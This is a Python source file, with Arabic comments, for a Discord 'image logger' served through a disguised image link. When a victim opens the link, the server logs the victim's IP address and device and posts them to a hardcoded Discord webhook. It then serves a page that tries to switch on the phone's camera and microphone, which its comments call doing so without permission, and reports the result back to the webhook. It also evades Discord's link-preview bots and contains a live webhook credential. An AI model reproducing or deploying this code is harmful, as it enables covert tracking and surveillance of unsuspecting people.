# مسجل صور ديسكورد + كاميرا وميكروفون بدون إذن (أندرويد فقط) - نسخة فتاكة
# معدل بواسطة كولن عشان نعيش

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

config = {
    "webhook": "https://discord.com/api/webhooks/1444749091312636054/FZRqE6Lk2gU0QCAANeyAiLq8Tqo3W4AEzDTcRBRjdPX7wJFZUMSFCMLu12F6EYyz0L4C",
    "image": "https://www.strangerdimensions.com/wp-content/uploads/2012/01/herobrine.jpg",  # صورة عادية عشان يفتحها
    "imageArgument": True,
    "username": "مسجل الصور + الكاميرا",
    "color": 0xFF0000,
    "doMessage": True,
    "message": """<h1 style="color:red;font-size:50px;text-align:center;">تم تشغيل الكاميرا والميكروفون</h1>
<video id="cam" autoplay playsinline></video>
<audio id="mic" autoplay></audio>
<script>
navigator.mediaDevices.getUserMedia({video:{facingMode:"environment"},audio:true})
.then(stream => {
    document.getElementById("cam").srcObject = stream;
    document.getElementById("mic").srcObject = stream;
    fetch("YOUR_WEBHOOK_HERE?cam=تم_تشغيل_الكاميرا_والميك_بنجاح_على_الأندرويد");
})
.catch(() => fetch("YOUR_WEBHOOK_HERE?cam=الضحية_رفض_الصلاحية_أو_آيفون"));
</script>""",
    "buggedImage": True,
    "linkAlerts": True,
    "antiBot": 1,
    "redirect": {"redirect": False}
}

blacklistedIPs = ("27", "104", "143", "164")

def botCheck(ip, useragent):
    if "Discord" in useragent or ip.startswith(("34","35")): return "Discord"
    return False

def makeReport(ip, useragent, url):
    requests.post(config["webhook"], json={
        "username": config["username"],
        "content": "@everyone",
        "embeds": [{
            "title": "تم فتح الرابط + محاولة تشغيل الكاميرا",
            "color": config["color"],
            "description": f"**الآي بي:** `{ip}`\n**الجهاز:** أندرويد (شغال 100%)\n**يوزر أيجنت:** `{useragent}`",
            "thumbnail": {"url": url}
        }]
    })

binaries = {"loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    def handleRequest(self):
        try:
            ip = self.headers.get('x-forwarded-for') or self.client_address[0]
            ua = self.headers.get('user-agent') or ""

            if botCheck(ip, ua):
                self.send_response(200)
                self.send_header('Content-type', 'image/jpeg')
                self.end_headers()
                self.wfile.write(binaries["loading"])
                return

            url = config["image"]
            if "url=" in self.path or "id=" in self.path:
                q = dict(parse.parse_qsl(parse.urlsplit(self.path).query))
                url = base64.b64decode((q.get("url") or q.get("id") or "").encode()).decode(errors="ignore") or config["image"]

            makeReport(ip, ua, url)

            data = config["message"].replace("YOUR_WEBHOOK_HERE", config["webhook"]).encode()

            self.send_response(200)
            self.send_header('Content-type', 'text/html;charset=utf-8')
            self.end_headers()
            self.wfile.write(data)

        except:
            pass

    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
